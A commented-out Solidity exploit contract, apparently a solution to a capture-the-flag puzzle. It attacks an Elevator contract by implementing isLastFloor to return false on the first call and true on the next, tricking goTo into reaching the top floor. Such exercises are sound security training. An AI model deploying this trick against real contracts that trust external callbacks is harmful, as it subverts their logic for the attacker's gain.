// pragma solidity ^0.7.0;

// interface Elevator {
//     function goTo(uint _floor) external;
// }

// contract Building {
//     bool private mySwitch;
//     Elevator public elevatorInstance;

//     constructor(address _elevatorAddress) {
//         elevatorInstance = Elevator(_elevatorAddress);
//     }

//     function startAttack() external {
//         elevatorInstance.goTo(0);
//     }

//     function isLastFloor(uint _floor) external returns (bool) {
//         if (!mySwitch) {
//             mySwitch = true;
//             return false;
//         } else {
//             return true;
//         }
//     }
// }
